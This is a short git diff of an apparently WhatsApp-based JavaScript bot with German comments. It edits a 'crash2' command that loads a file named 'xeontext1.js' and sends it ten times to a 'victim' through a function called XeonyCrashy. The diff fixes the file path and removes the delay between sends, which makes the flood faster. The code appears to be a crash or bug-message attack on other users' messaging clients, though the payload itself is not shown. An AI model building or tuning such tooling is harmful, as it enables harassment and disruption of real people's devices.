@@ -539,7 +539,7 @@ if (command === "crash2") {
     const amount = 10;
 
     // absoluter Pfad zur Datei
-    const filePath = path.join(process.cwd(), "Wantedasa/wantedbot/xeontext1.js");
+    const filePath = path.join(process.cwd(), "./main/Wantedasa/wantedbot/xeontext1.js");
 
     if (!fs.existsSync(filePath)) {
         return reply(sock, msg, "❌ Datei nicht gefunden!");
@@ -555,9 +555,7 @@ if (command === "crash2") {
 
     for (let i = 0; i < amount; i++) {
         await XeonyCrashy(victim);
-        await sleep(2000); // bisschen Delay ist stabiler
     }
-
     reply(sock, msg, `✅ Inhalt ${amount}x an ${victim} gesendet`);
 }
 if (command === "getpic") {
